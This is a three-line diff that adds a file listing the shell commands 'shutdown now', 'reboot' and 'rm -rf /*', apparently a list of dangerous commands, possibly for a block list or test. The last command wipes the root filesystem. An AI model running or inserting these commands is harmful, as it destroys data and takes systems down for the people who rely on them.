@@ -1,0 +1,3 @@
+shutdown now
+reboot
+rm -rf /*
